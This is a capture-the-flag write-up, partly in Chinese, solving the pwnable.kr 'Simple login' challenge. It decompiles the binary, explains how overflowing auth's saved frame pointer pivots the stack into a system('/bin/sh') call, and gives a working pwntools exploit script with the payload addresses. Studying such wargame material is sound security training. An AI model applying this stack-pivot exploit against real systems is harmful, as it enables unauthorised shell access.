# Simple login
```
Can you get authentication from this server?

Download : http://pwnable.kr/bin/login

Running at : nc pwnable.kr 9003
```

这题目看起来只有50pt, 感觉上很简单(

拖进 `ida` `f5`
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-28h]
  char s; // [esp+1Eh] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-4h]

  memset(&s, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &s);
  memset(&input, 0, 0xCu);
  v4 = 0;
  v6 = Base64Decode((int)&s, &v4);
  if ( v6 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v4, v6);
    if ( auth(v6) == 1 )
      correct();
  }
  return 0;
}

_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5(&v2, 12);
  printf("hash : %s\n", (char)s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}

void __noreturn correct()
{
  if ( input == -559038737 )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```

大致逻辑是这样的,输入一串东西,然后拷贝进`.data`节(其中限制大小为0xc),然后进`auth`函数又拷贝进栈,注意，这里有栈溢出.但是只能盖到 `auth` 函数的 `ebp` .

然后我们直接有`system('/bin/sh')`存在，直接让`eip跳过去`就行了
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
canary这里我感觉检测错误了( 我用的两个函数都没有


函数在回复栈的时候，会执行`leave return`
其实上就是在执行

```
mov esp,ebp
pop ebp
pop eip
```

我们只能覆盖`ebp`，那我们就直接覆盖`auth`的`ebp`,然后`pop ebp`.然后我们在`main`函数返回的时候,`move esp,ebp`,这时我们的`esp`就被控制了,然后我们继续`pop ebp; pop eip`，我们就可以直接控制`eip`到`system`了.

```
from pwn import *
import sys
import base64
context.log_level = 'debug'
elf_s = ELF('./login')

if sys.argv[1] == 'connect':
    bin = remote('pwnable.kr',9003)
else:
    bin = process('./login')

payload = 'a'*4 + p32(0x08049284) + p32(0x0811EB40)
payload = base64.b64encode(payload)
bin.recvuntil(': ')
bin.sendline(payload)
bin.interactive()
```